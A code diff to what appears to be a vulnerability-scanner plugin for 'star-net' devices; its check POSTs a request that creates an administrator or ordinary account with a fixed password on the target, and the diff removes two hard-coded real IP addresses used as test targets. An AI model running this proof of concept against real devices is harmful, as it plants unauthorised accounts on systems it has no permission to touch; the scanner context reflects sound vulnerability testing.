@@ -34,6 +34,7 @@ def audit(arg):
     #flag=23/24表示添加管理员成功
     if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
         security_hole('任意添加管理员:' + url + ' POST:' +post)
+        return arg
     else:
         #添加管理员账户不成功，尝试添加普通账户（管理员账户最多有4个）
         post = 'plus_type=0&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(username=username)
@@ -41,8 +42,8 @@ def audit(arg):
         if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
             security_hole('任意添加用户:' + url + ' POST:' +post)
 
-    
-if __name__ == '__main__':
+
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('star-net','http://61.235.12.6/')[1])
-    audit(assign('star-net','http://61.235.13.110/')[1])
